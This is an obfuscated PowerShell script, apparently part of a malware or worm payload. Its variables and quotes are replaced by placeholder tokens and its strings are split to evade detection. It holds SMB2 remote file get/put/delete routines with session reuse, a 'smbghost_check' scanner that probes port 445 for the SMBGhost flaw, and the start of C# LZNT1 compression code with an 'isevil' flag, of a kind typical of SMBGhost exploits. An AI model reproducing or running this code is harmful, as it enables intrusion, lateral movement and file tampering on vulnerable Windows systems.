                            Add-Member -InputObject wB69directory_object -MemberType NoteProperty -Name LastWriteTime -Value wB69directory_contents_last_write_time_list[wB69i]

                            wB69directory_contents_output += wB69directory_object

                            wB69i++

                        }


                        if(wB69directory_contents_output -and !wB69Modify)

                        {


                            if(wB69directory_contents_hide_headers)

                            {

                                (wB69directory_contents_output uOva Format-Table -Property @{ Name=NDckModeNDck; Expression={wB69_.Mode }; Alignment=NDckleftNDck; },

                                                                            @{ Name=NDckLastWriteTimeNDck; Expression={wB69_.LastWriteTime }; Alignment=NDckrightNDck; },

                                                                            @{ Name=NDckLengthNDck; Expression={wB69_.Length }; Alignment=NDckrightNDck; },

                                                                            @{ Name=NDckNameNDck; Expression={wB69_.Name }; Alignment=NDckleftNDck; } -AutoSize -HideTableHeaders -WrapuOva Out-String).Trim()

                            }

                            else

                            {

                                wB69directory_contents_hide_headers = wB69true

                                (wB69directory_contents_output uOva Format-Table -Property @{ Name=NDckModeNDck; Expression={wB69_.Mode }; Alignment=NDckleftNDck; },

                       '+'                                                     @{ Name=NDckLastWriteTimeNDck; Expression={wB69_.LastWriteTime }; Alignment=NDckrightNDck; },

                                                                            @{ '+'Name=NDckLengthNDck; Expression={wB69_.Length }; Alignment=NDckrightNDck; },

                                                                            @{ Name=NDckNameNDck; Expression={wB69_.Name }; Alignment=NDckleftNDck; } -AutoSize -WrapuOva Out-String).Trim()

                            }


                        }

                        else

                        {

                            wB69directory_contents_output

                        }


                        wB69subdirectory_list.Reverse() > wB69null


                        ForEach(wB69subdirectory in wB69subdirectory_list)

                        {  

                            wB69directory_list.Insert(0,(wB69root_directory + wB69subdirectory)) > wB69null

                        }

                        

                        wB69SMB_offset = 0

                        wB69stage = utH9CloseRequestutH9

                    }


                    utH9QueryInfoRequestutH9

                    {

                        wB69message_ID++

                        wB69packet_SMB2_header = New-PacketSMB2Header 0x10,0x00 0x01,0x00 wB69SMB_signing wB69message_ID wB69process_ID wB69tree_ID wB69session_ID

                        wB69packet_SMB2_header[NDckNextCommandNDck] = wB69hea'+'der_next_command

                        wB69packet_SMB2_data = New-PacketSMB2QueryInfoRequest wB69query_info_request_info_type_1 wB69query_info_request_file_info_class_1 wB69query_info_request_output_buffer_length_1 wB69query_info_request_input_buffer_offset_1 wB69file_ID wB69query_info_request_buffer_1

                        wB69SMB2_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_header

                        wB69SMB2_data = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_data    


                        if(wB69SMB_signing)

                        {

                            wB69SMB2_sign = wB69SMB2_header + wB69SMB2_data 

                            wB69SMB2_signature = wB69HMAC_SHA256.ComputeHash(wB69SMB2_sign)

                            wB69SMB2_signature = wB69SMB2_signature[0..15]

                            wB69packet_SMB2_header[NDckSignatureNDck] = wB69SMB2_signature

                            wB69SMB2_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_header

                        }


                        wB69message_ID++

                        wB69packet_SMB2b_header = New-PacketSMB2Header 0x10,0x00 0x01,0x00 wB69SMB_signing wB69message_ID wB69process_ID wB69tree_ID wB69session_ID


                        if(wB69SMB_signing)

                        {

                            wB69packet_SMB2b_header[NDckFlagsNDck] = 0x0c,0x00,0x00,0x00      

                        }

                        else

                        {

                            wB69packet_SMB2b_header[NDckFlagsNDck] = 0x04,0x00,0x00,0x00

                        }


                        wB69packet_SMB2b_data = New-PacketSMB2QueryInfoRequest wB69query_info_request_info_type_2 wB69query_info_request_file_info_class_2 w'+'B69query_info_request_output_buffer_length_2 wB69query_info_request_input_buffer_offset_2 wB69file_ID wB69query_info_request_buffer_2

                        wB69SMB2b_header = ConvertFrom-PacketOrderedDic'+'tionary wB69packet_SMB2b_header

                        wB69SMB2b_data = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2b_data

                        wB69packet_NetBIOS_session_service = New-PacketNetBIOSSessionService (wB69SMB2_header.Length + wB69SMB2b_header.Length)  (wB69SMB2_data.Length + wB69SMB2b_data.Length)

                        wB69NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary wB69packet_NetBIOS_session_service


                        if(wB69SMB_signing)

                        {

                            wB69SMB2_sign = wB69SMB2b_header + wB69SMB2b_data 

                            wB69SMB2_signature = wB69HMAC_SHA256.Com'+'puteHash(wB69SMB2_sign)

                            wB69SMB2_signature = wB69SMB2_signature[0..15]

                            wB69packet_SMB2b_header[NDckSignatureNDck] = wB69SMB2_signature

                            wB69SMB2b_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2b_header

                        }


                        wB69client_send = wB69NetBIOS_session_service + wB69SMB2_header + wB69SMB2_data + wB69SMB2b_header + wB69SMB2b_data

                        wB69client_stream.Write(wB69client_send,0,wB69client_send.Length) > wB69null

                        wB69client_stream.Flush()

                        wB69client_stream.Read(wB69client_receive,0,wB69client_receive.Length) > wB69null


                        if(wB69share_subdirectory_start)

                        {

                            wB69file = [System.Text.Encoding]::Unicode.GetBytes(wB69share_subdirectory)

                            wB69root_directory = wB69file + 0x5c,0x00

                            wB69create_request_extra_info = 1

                            wB69stage = utH9CreateRequestutH9

                        }

                        elseif(wB69Action -eq utH9GetutH9)

                        {


                            switch(wB69action_step)

                            {


                                5

                                {

                                    wB69query_info_response = [System.BitConverter]::ToString(wB69client_receive)

                                    wB69query_info_response = wB69query_info_response -replace NDck-NDck,NDckNDck

                                    wB69file_stream_size_index = wB69query_info_response.Substring(10).IndexOf(NDckFE534D42NDck) + 170

                                    wB69file_stream_size = [System.BitConverter]::ToUInt32(wB69client_receive[(wB69file_stream_size_index / 2)..(wB69file_stream_size_index / 2 + 8)],0)

   '+'                                 wB69file_stream_size_quotient = [Math]::Truncate(wB69file_stream_size / 65536)

                                    wB69file_stream_size_remainder = wB69file_stream_size % 65536

                                    wB69percent_complete = wB69file_stream_size_quotient


                                    if(wB69file_stream_size_remainder -ne 0)

                                    {

                                        wB69percent_complete++

                                    }

                                    

                                    if(wB69file_stream_size -lt 1024)

                                    {

                                        wB69progress_file_size = NDckNDck + wB69file_stream_size + NDckBNDck

                                    }

                                    elseif(wB69file_stream_size -lt 1024000)

                                    {

                                        wB69progress_file_size = NDckNDck + (wB69file_stream_size / 1024).ToString(utH9.00utH9) + NDckKBNDck

                                    }

                                    else

                                    {

                                        wB69progress_file_size = NDckNDck + (wB69file_stream_size / 1024000).ToString(utH9.00utH9) + NDckMBNDck

                                    }


                                    wB69header_next_command = 0x70,0x00,0x00,0x00

                                    wB69query_info_request_info_type_1 = 0x02

                                    wB69query_info_request_file_info_class_1 = 0x01

                                    wB69query_info_request_output_buffer_length_1 = 0x58,0x00,0x00,0x00

                                    wB69query_info_request_input_buffer_offset_1 = 0x00,0x00

                                    wB69query_info_request_buffer_1 = 8

                                    wB69query_info_request_info_type_2 = 0x02

                                    wB69query_info_request_file_info_class_2 = 0x05

                                    wB69query_info_request_output_buffer_length_2 = 0x50,0x00,0x00,0x00

                                    wB69query_info_request_input_buffer_offset_2 = 0x00,0x00

                                    wB69query_info_request_buffer_2 = 1

                                    wB69action_step++

                                    wB69stage = utH9QueryInfoRequestutH9

                                }


                                6

                                {


                                    if(wB69file_stream_size -lt 65536)

                                    {

                                        wB69read_request_length = wB69file_stream_size

                                    }

                                    else

                                    {

                                        wB69read_request_length = 65536

                                    }


                                    wB69read_request_offset = 0

                                    wB69read_request_step = 1

                                    wB69action_step++

                                    wB69stage = utH9ReadRequestutH9

                                }


                            }

                        }

                        elseif(wB69Action -eq utH9PututH9)

                        {

                            wB69percent_complete = wB69source_file_size_quotient


                            if(wB69source_file_size_remainder -ne 0)

                            {

                                wB69percent_complete++

                            }


                            if(wB69source_file_size -lt 1024)

                            {

                                wB69progress_file_size = NDckNDck + wB69source_file_size + NDckBNDck

                            }

                            elseif(wB69source_file_size -lt 1024000)

                            {

                                wB69progress_file_size = NDckNDck + (wB69source_file_size / 1024).ToString(utH9.00utH9) + NDckKBNDck

                            }

                            else

                            {

                                wB69progress_file_size = NDckNDck + (wB69source_file_size / 1024000).ToString(utH9.00utH9) + NDckMBNDck

                            }


                            wB69action_step++

                            wB69set_info_request_file_info_class = 0x01

                            wB69set_info_request_info_level = 0x14

                            wB69set_info_request_buffer = [System.BitConverter]::GetBytes(wB69source_file_size)

                            wB69stage = utH9SetInfoRequestutH9

                        }

                        elseif(wB69Action -eq utH9DeleteutH9)

                        {

                            wB69stage = utH9CreateRequestutH9

                        }

                        else

                        {

                            wB69stage = utH9CreateRequestFindRequestutH9

                        }


                    }


                    utH9ReadRequestutH9

                    {

                        wB69message_ID++

                        wB69packet_SMB2_header = New-PacketSMB2Header 0x08,0x00 0x01,0x00 wB69SMB_signing wB69message_ID wB69process_ID wB69tree_ID wB69session_ID

                        wB69packet_SMB2_data = New-PacketSMB2ReadRequest wB69read_request_length wB69read_request_offset wB69file_ID

                        wB69SMB2_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_header

                        wB69SMB2_data = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_data 

                        wB69packet_NetBIOS_session_service = New-PacketNetBIOSSessionService wB69SMB2_header.Length wB69SMB2_data.Length

                        wB69NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary wB69packet_NetBIOS_session_service


                        if(wB69SMB_signing)

                        {

                            wB69SMB2_sign = wB69SMB2_header + wB69SMB2_data 

                            wB69SMB2_signature = wB69HMAC_SHA256.ComputeHash(wB69SMB2_sign)

                            wB69SMB2_signature = wB69SMB2_signature[0..15]

                            wB69packet_SMB2_header[NDckSignatureNDck] = wB69SMB2_signature

                            wB69SMB2_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_header

                        }


                        wB69client_send = wB69NetBIOS_session_service + wB69SMB2_header + wB69SMB2_data 

                        wB69client_stream.Write(wB69client_send,0,wB69client_send.Length) > wB69null

                        wB69client_stream.Flush()

                        Start-Sleep -m 5


                        if(wB69read_request_length -eq 65536)

                        {

                            wB69i = 0


                            while(wB69client.Available -lt 8192 -and wB69i -lt 10)

                            {

                                Start-Sleep -m wB69Sleep

                                wB69i++

                            }


                        }

                        else

                        {

                            Start-Sleep -m wB69Sleep

                        }

                        

                        wB69client_stream.Read(wB69client_receive,0,wB69client_receive.Length) > wB69null


                        if(wB69Action -eq utH9GetutH9 -and wB69action_step -eq 3)

                        {

                            wB69action_step++

                            wB69create_request_extra_info = 1

                            wB69stage = utH9CreateRequestutH9

                        }

                        elseif(wB69Action -eq utH9GetutH9 -and wB69action_step -eq 7)

                        {


                            if(!wB69NoProgress)

                            {

                                wB6'+'9percent_complete_calculation = [Math]::Truncate(wB69read_request_step / wB69percent_com'+'plete * 100)

                                Write-Progress -Activity NDckDownloading wB69source_file - wB69progress_file_sizeNDck -Status NDckwB69percent_complete_calculation% Complete:NDck -PercentComplete wB69percent_complete_calculation

                            }


                            wB69file_bytes ='+' wB69client_receive[84..(wB69read_request_length + 83)]

    

                            if(!wB69Modify)

                            {


                                if(!wB69file_write)

                                {

                                    wB69file_write = New-Object utH9System.IO.FileStreamutH9 wB69destination_path,utH9AppendutH9,utH9WriteutH9,utH9ReadutH9

                                }


                                wB69file_write.Write(wB69file_bytes,0,wB69file_bytes.Count)

                            }

                            else

                            {

                                wB69file_memory.AddRange(wB69file_bytes)

                            }


                            if(wB69read_request_step -lt wB69file_stream_size_quotient)

                            {

                                wB69read_request_offset+=65536

                                wB69read_request_step++

                                wB69stage = utH9ReadRequestutH9

                            }

                            elseif(wB69read_request_step -eq wB69file_stream_size_quotient -and wB69file_stream_size_remainder -ne 0)

                            {

                                wB69read_request_length = wB69file_stream_size_remainder

                                wB69read_request_offset+=65536

                                wB69read_request_step++

                                wB69stage = utH9ReadRequestutH9

                            }

                            else

                            {


                                if(!wB69Modify)

                                {

                                    wB69file_write.Close()

                                }

                                else

                                {

                                    [Byte[]]wB69file_memory = wB69file_memory

                                    ,wB69file_memory

                                }


                                wB69output_message = NDck[+] File downloadedNDck

                                wB69stage = utH9CloseRequestutH9

                            }

                            

                        }

                        elseif([System.BitConverter]::ToString(wB69client_receive[12..15]) -ne utH903-01-00-00utH9)

                        {

                            wB69stage = utH9CloseRequestutH9

                        }

                        else

                        {

                            wB69stage = utH9CloseRequestutH9

                        }


                    }


                    utH9SetInfoRequestutH9

                    {

                        wB69message_ID++

                        wB69packet_SMB2_header = New-PacketSMB2Header 0x11,0x00 0x01,0x00 wB69SMB_signing wB69message_ID wB69process_ID wB69tree_ID wB69session_ID

                        wB69packet_SMB2_data = New-PacketSMB2SetInfoRequest wB69set_info_request_file_info_class wB69set_info_request_info_level wB69file_ID wB69set_info_request_buffer

                        wB69SMB2_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_header

                        wB69SMB2_data = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_data    

                        wB69packet_NetBIOS_session_service = New-PacketNetBIOSSessionService wB69SMB2_header.Length wB69SMB2_data.Length

                        wB69NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary wB69packet_NetBIOS_session_service


                        if(wB69SMB_signing)

                        {

                            wB69SMB2_sign = wB69SMB2_header + wB69SMB2_data 

                            wB69SMB2_signature = wB69HMAC_SHA256.ComputeHash(wB69SMB2_sign)

                            wB69SMB2_signature = wB69SMB2_signature[0..15]

                            wB69packet_SMB2_header[NDckSignatureNDck] = wB69SMB2_signature

                            wB69SMB2_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_header

                        }


                        wB69client_send = wB69NetBIOS_session_service + wB69SMB2_header + wB69SMB2_data

                        wB69client_stream.Write(wB69client_send,0,wB69client_send.Length) > wB69null

                        wB69client_stream.Flush()

                        wB69client_stream.Read(wB69client_receive,0,wB69client_receive.Length) > wB69null


                        if(wB69source_file_size -le 65536)

                        {

                            wB69write_request_length = wB69source_file_size

               '+'         }

                        else

                        {

                            wB69write_request_length = 65536

                        }


                        wB69write_request_offset = 0

                        wB69write_request_step = 1


                        if(wB69Action -eq utH9DeleteutH9)

                        {

                            wB69output_message = NDck[+] File deletedNDck

                            wB69stage = utH9CloseRequestutH9

                            wB69action_step++

                        }

                        elseif(wB69Action -eq utH9PututH9 -and wB69action_step -eq 4)

                        {

                            wB69output_message = NDck[+] File uploadedNDck

                            wB69stage = utH9CloseRequestutH9

                        }

                        else

                        {

                            wB69stage = utH9WriteRequestutH9

                        }


                    }


                    utH9TreeConnectutH9

                    {

                        wB69message_ID++

                        wB69'+'packet_SMB2_header = New-PacketSMB2Header 0x03,0x00 0x1f,0x00 wB69SMB_signing wB69message_ID wB69process_ID wB69tree_ID wB69session_ID

                        wB69packet_SMB2_data = New-PacketSMB2TreeConnectRequest wB69path_bytes

                        wB69SMB2_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_header

       '+'                 wB69SMB2_data = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_data    

                        wB69packet_NetBIOS_session_service = New-PacketNetBIOSSessionService wB69SMB2_header.Length wB69SMB2_data.Length

                        wB69NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary wB69packet_NetBIOS_session_service


                        if(wB69SMB_signing)

                        {

                            wB69SMB2_sign = wB69SMB2_header + wB69SMB2_data 

                            wB69SMB2_signature = wB69HMAC_SHA256.ComputeHash(wB69SMB2_sign)

                            wB69SMB2_signature = wB69SMB2_signature[0..15]

                            wB69packet_SMB2_header[NDckSignatureNDck] = wB69SMB2_signature

                            wB69SMB2_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_header

                        }


                        wB69client_send = wB69NetBIOS_session_service + wB69SMB2_header + wB69SMB2_data


                        try

                        {

                            wB69client_stream.Write(wB69client_send,0,wB69client_send.Length) > wB69null

                            wB69client_stream.Flush()

                            wB69client_stream.Read(wB69client_receive,0,wB69client_receive.Length) > wB69null

                        }

                        catch

                        {

                            Write-Output NDck[-] Session connection is closedNDck

                            wB69stage = utH9ExitutH9

                        }

                        

                        if(wB69stage -ne utH9ExitutH9)

                        {


                            if([System.BitConverter]::ToString(wB69client_receive[12..15]) -ne utH900-00-00-00utH9)

                            {

                                wB69error_code = [System.BitConverter]::ToStr'+'ing(wB69client_receive[12..15])


                                switch(wB69error_code)

                                {


                                    utH9cc-00-00-c0utH9

                                    {

                                        wB69output_message = NDck[-] Share not foundNDck

                                        wB69stage = utH9ExitutH9

                                    }


                                    utH922-00-00-c0utH9

                                    {

                                        wB69output_message = NDck[-] Access deniedNDck

                                        wB69stage = utH9ExitutH9

                                    }


                                    default

                                    {

                                        wB69error_code = wB69error_code -replace NDck-NDck,NDckNDck

                                        wB69output_message = NDck[-] Tree connect error code 0xwB69error_codeNDck

                                        wB69stage = utH9ExitutH9

                                    }


                                }


                            }

                            elseif(wB69refresh)

                            {

                                Write-Output NDck[+] Session refreshedNDck

                                wB69stage = utH9ExitutH9

         '+'                   }

                            elseif(!wB69SMB_IPC)

                            {

                                wB69SMB_share_pat'+'h = NDck9e09e0NDck + wB69Target + NDck9e0NDck + wB69Share

                                wB69path_bytes = [System.Text.Encoding]::Unicode.GetBytes(wB69SMB_share_path)

                                wB69SMB_IPC = wB69true

                                wB69stage = utH9IoctlRequestutH9

                                wB69file = NDckNDck

                            }

                            else

          '+'                  {


                                if(wB69Action -eq utH9PututH9)

                                {

                                    wB69file = [System.Text.Encoding]::Unicode.GetBytes(wB69share_subdirectory)

                                    wB69create_request_extra_info = 2

                                }

                                else

                                {

                                    wB69create_request_extra_info = 1

                                }


                                wB69tree_ID = wB69client_receive[40..43]

                                wB69stage = utH9CreateRequestutH9


                                if(wB69Action -eq utH9GetutH9)

                                {

                                    wB69file = [System.Text.Encoding]::Unicode.GetBytes(wB69share_subdirectory)

                                }


                            }


                        }


                    }


                    utH9TreeDisconnectutH9

                    {

                        wB69message_ID++

                        wB69packet_SMB2_header = New-PacketSMB2Header 0x04,0x00 0x01,0x00 wB69SMB_signing wB69message_ID wB69process_ID wB69tree_ID wB69session_ID

                        wB69packet_SMB2_data = New-PacketSMB2TreeDisconnectRequest

                        wB69SMB2_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_header

                        wB69SMB2_data = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_data

                        wB69packet_NetBIOS_session_service = New-PacketNetBIOSSessionService wB69SMB2_header.Length wB69SMB2_data.Length

                        wB69NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary wB69packet_NetBIOS_session_service


                        if(wB69SMB_signing)

                        {

                            wB69SMB2_sign = wB69SMB2_header + wB69SMB2_data

                            wB69SMB2_signature = wB69HMAC_SHA256.ComputeHash(wB69SMB2_sign)

                            wB69SMB2_signature = wB69SMB2_signature[0..15]

                            wB69packet_SMB2_header[NDckSignatureNDck] = wB69SMB2_signature

                            wB69SMB2_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_header

                        }


                        wB69client_send = wB69NetBIOS_session_service + wB69SMB2_header + wB69SMB2_data

                        wB69client_stream.Write(wB69client_send,0,wB69client_send.Length) > wB69null

                        wB69client_stream.Flush()

                        wB69client_stream.Read(wB69client_receive,0,wB69client_receive.Length) > wB69null


                        if(wB69inveigh_session -and !wB69Logoff)

                        {

                            wB69stage = utH9ExitutH9

                        }

                        else

                        {

                            wB69stage = utH9LogoffutH9

                        }


                    }

                        

                    utH9WriteRequestutH9

                    {


                        if(!wB69Modify)

                        {

                            wB69source_file_binary_reader.BaseStream.Seek(wB69write_request_offset,NDckBeginNDck) > wB69null

                            wB69source_file_binary_reader.Read(wB69source_file_buffer,0,wB69source_file_buffer_size) > wB69null

                        }

                        else

                        {

                            wB69source_file_buffer = wB69Source[wB69write_request_offset..(wB69write_request_offset+wB69write_request_length)]

                        }

                        wB69message_ID++

                        wB69packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 wB69SMB_signing wB69message_ID wB69process_ID wB69tree_ID wB69session_ID

                        wB69packet_SMB2_header[NDckCreditChargeNDck] = 0x01,0x00

                        wB69packet_SMB2_data = New-PacketSMB2WriteRequest wB69write_request_length wB69write_request_offset wB69file_ID wB69source_file_buffer

                        wB69SMB2_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_header

                        wB69SMB2_data = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_data 

                        wB69packet_NetBIOS_session_service = New-PacketNetBIOSSessionService wB69SMB2_header.Length wB69SMB2_data.Length

                        wB69NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary wB69packet_NetBIOS_session_service


                        if(wB69SMB_signing)

                        {

   '+'                         wB69SMB2_sign = wB69SMB2_header + wB69SMB2_data 

                            wB69SMB2_signature = wB69HMAC_SHA256.ComputeHash(wB69SMB2_sign)

                            wB69SMB2_signature = wB69SMB2_signature[0..15]

                            wB69packet_SMB2_header[NDckSignatureNDck] = wB69SMB2_signature

                            wB69SMB2_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_header

                        }


                        wB69client_send = wB69NetBIOS_session_service + wB69SMB2_header + wB69SMB2_data 

                        wB69client_stream.Write(wB69client_send,0,wB69client_send.Length) > wB69null

                        wB69client_stream.Flush()

                        wB69client_stream.Read(wB69client_receive,0,wB69client_receive.Length) > wB69null


                        if(wB69write_request_step -lt wB69source_file_size_quotient)

                        {


                            if(!wB69NoProgress)

                            {

                                wB69percent_complete_calculation = [Math]::Truncate(wB69write_request_step / wB69percent_complete * 100)

                                Write-Progress -Activity NDck[*] Uploading wB69source_file - wB69progress_file_sizeNDck -Status NDckwB69percent_complete_calculation% Complete:NDck -PercentComplete wB69percent_complete_calculation

                            }


                            wB69write_request_offset+=65536

                            wB69write_request_step++

                            wB69stage = utH9WriteRequestutH9

                        }

                        elseif(wB69write_request_step -eq wB69source_file_size_quotient -and wB69source_file_size_remainder -ne 0)

                        {

                            wB69write_request_length = wB69source_file_size_remainder

                            wB69write_request_offset+=65536

                            wB69write_request_step++

                            wB69stage = utH9WriteRequestutH9

                        }

                        else

                        {

                            wB69action_step++

                            wB69set_info_request_file_info_class = 0x01

                            wB69set_info_request_info_level = 0x04

                            wB69set_info_request_buffer = wB69source_file_creation_time +

                                                        wB69source_file_last_access_time +

                                                        wB69source_file_last_write_time +

                                                        wB69source_file_last_change_time + 

                                                        0x00,0x00,0x00,0x00,

                                                        0x00,0x00,0x00,0x00


                            if(!wB69Modify)

                            {

                                wB69stage = utH9SetInfoRequestutH9

                            }

                            else

                            {

                                wB69output_message = NDck[+] File uploaded from memoryNDck

                                wB69stage = utH9CloseRequestutH9

                            }


                        }


                    }

                    

                }

            

            }


        }


    }

    catch

    {

        Write-Output NDck[-] wB69(wB69_.Exception.Message)NDck

    }

    finally

    {  


        if(wB69file_write.Handle)

        {

            wB69file_write.Close()

        }


        if(wB69source_file_stream'+'.Handle)

        {

            wB69source_file_binary_reader.Close()

            wB69source_file_stream.Close()

        }


        if(wB69inveigh_session -and wB69Inveigh)

        {

            wB69inveigh.session_lock_table[wB69session] = utH9openutH9

            wB69inveigh.session_message_ID_table[wB69session] = wB69message_ID

            wB69inveigh.session[wB69session] uOva Where-Object {wB69_.NDckLast ActivityNDck = Get-Date -format s}

        }


        if(!wB69inveigh_session -or wB69Logoff)

        {

            wB69client.Close()

            wB69client_stream.Close()

        }


    }


}


    if(!wB69Modify -or wB69Action -eq utH9PututH9)

    {

        Write-Output wB69output_message

    }

    elseif(wB69output_message)

    {

        Write-Verbose wB69output_message

    }


}

function smbghost_check(wB69tip) {

	function check_vul(wB69sock) {

		wB69ret = 0

		[Byte[]] wB69pkt = @()

		wB69pkt += 0x00,0x00,0x00,0xC4,0xFE,0x53,0x4D,0x42,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x24,0x00,0x08,0x00,0x00,0x00,0x00,0x00,0x7F,0x00,0x00,0x00,0x01,0x02,0xAB,0xCD,0x01,0x02,0xAB,0xCD,0x01,0x02,0xAB,0xCD,0x01,0x02,0xAB,0xCD,0x78,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x02,0x02,0x10,0x02,0x22,0x02,0x24,0x02,0x00,0x03,0x02,0x03,0x10,0x03,0x11,0x03,0x00,0x00,0x00,0x00,0x01,0x00,0x26,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x20,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x03,0x00,0x0E,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x02,0x00,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00

		wB69sock.Send(wB69pkt)uOvaout-null

		wB69nb = [Array]::CreateInstance((utH9bytutH9+utH9eutH9), 4)

		wB69recv = wB69sock.Receive(wB69nb)

		wB69len = [bitconverter]::ToUInt16(wB69nb[4..2],0)

		wB69res = [Array]::CreateInstance((utH9bytutH9+utH9eutH9), wB69len)

		wB69recv = wB69sock.Receive(wB69res)

		if(wB69res[68] -eq 0x11 -and wB69res[69] -eq 0x03 -and wB69res[70] -eq 0x02 -and wB69res[71] -eq 0x00){

			wB69ret = 1

			write-host NDckVUl.NDck

		}

		return wB69ret

	}

    try{

        wB69client = NEir8W-ir8objir8EcT System.Net.Sockets.TcpClient(wB69target,445)

    }catch{

        return wB69false

    }

    wB69sock = wB69client.Client

    wB69ret = check_vul wB69sock

    wB69sock.Close() uOva out-null

    return wB69ret

}

wB69lznt1sou'+'rce=@utH9

using System;

using System.Collections.Generic;

namespace Compression

{ 

	public class LzWindowDictionary

    {

        private List<int>[] _offsetList;

        public LzWindowDictionary()

        {

            Initalize();

            _offsetList = new List<int>[0x100];

            for (int i = 0; i < _offsetList.Length; i++)

            {

                _offsetList[i] = new List<int>();

            }

        }

        public int MinMatchAmount = 0;

        public int MaxMatchAmount = 0;

        private int BlockSize = 0;

        public void Reset()

        {

            Initalize();

            for (int i = 0; i < _offsetList.Length; i++)

            {

                _offsetList[i].Clear();

            }

        }

        public int[] Search(byte[] decompressedData, int decompressedDataOffset, uint index, uint length)

        {

            RemoveOldEntries(decompressedData[decompressedDataOffset + index]); // Remove old entries for this index 

            int[] match = new int[] { 0, 0 };

            if (index < 1 uOvauOva length - index < MinMatchAmount)

            {

                return match;

            }

            for (int i = 0; i < _offsetList[decompressedData[decompressedDataOffset + index]].Count; i++)

            {

                int matchStart = _offsetList[decompressedData[decompressedDataOffset + index]][i];

                int matchSize = 1;

                if (index - matchStart > BlockSize)

                {

                    break;

                }

                int maxMatchSize = (int)Math.Min(Math.Min(MaxMatchAmount, BlockSize), Math.Min(length - index, length - matchStart));

                while (matchSize < maxMatchSize && deco'+'mpressedData[decompressedDataOffset + index + matchSize] == decompressedData[decompressedDataOffset + matchStart + matchSize])

                {

                    matchSize++;

                }

                if (matchSize >= MinMatchAmount && matchSize > match[1])

                {

                    match = new int[] { (int)(index - matchStart), matchSize };

                    if (matchSize == MaxMatchAmount)

                    {

                        break;

                    }

                }

            }

            return match;

        }

        public void AddEntry(byte[] decompressedData, int decompressedDataOffset, int index)

        {

            _offsetList[decompressedData[decompressedDataOffset + index]].Add(index);

        }

        public void AddEntryRange(byte[] decompressedData, int decompressedDataOffset, int index, int length)

        {

            for (int i = 0; i < length; i++)

            {

                AddEntry(decompressedData, decompressedDataOffset, index + i);

            }

        }

        private void Initalize()

        {

            MinMatchAmount = 3;

            MaxMatchAmount = 18;

            BlockSize = 4096;

        }

        private void RemoveOldEntries(byte index)

        {

            while (_offsetList[index].Count > 256)

            {

                _offsetList[index].RemoveAt(0);

            }

        }

    }

    public class LZNT1

    {

        private const ushort SubBlockIsCompressedFlag = 0x8000;

        private const ushort SubBlockSizeMask = 0x0fff;

        private const int FixedBlockSize = 0x1000;

        private static byte[] s_compressionBits = CalcCompressionBits();

		private static int BlockSize = 4096;

        public int Compress(byte[] source, ref byte[] compressed, bool isevil)

		{

			uint sourcePointer = 0;

			uint sourceCurrentBlock = 0;

			uint destPointer = 0;

			int sourceOffset = 0;

			int sourceLength = source.Length;

			int compressedLength = compressed.Length;

			int compressedOffset = 0;

			LzWindowDictionary lzDictionary = new LzWindowDictionary();

			bool nonZeroDataFound = false;

			for (int subBlock = 0; subBlock < sourceLength; subBlock += BlockSize)

			{

				lzDictionary.MinMatchAmount = 3;

				sourceCurrentBlock = sourcePointer;

				uint decompressedSize = (uint)Math.Min(sourceLength - subBlock, BlockSize);

				uint compressedSize = 0;

				uint headerPosition = destPointer;

				compressed[compressedOffset + destPointer] = compressed[compressedOffset + destPointer '+'+ 1] = 0;

				destPointer += 2;

				while (sourcePointer - subBlock < decompressedSize)

				{

					if (destPointer + 1 >= compressedLength)

					{

						return -1;

					}

					byte bitFlag = 0x0;

					uint flagPosition = destPointer;

					compressed[compressedOffset + destPointer] = bitFlag; // It will be filled in later 

					compressedSize++;

					destPointer++;

					for (int i = 0; i < 8; i++)

					{

						int lengthBits = 16 - s_compressionBits[sourcePointer - subBlock];

						ushort lengthMask = (ushort)((1 << s_compressionBits[sourcePointer - subBlock]) - 1);

						lzDictionary.MaxMatchAmount = Math.Min(1 << lengthBits, BlockSize - 1);

						int[] lzSearchMatch = lzDictionary.Search(source, sourceOffset + subBlock, (uint)(sourcePointer - subBlock), decompressedSize);

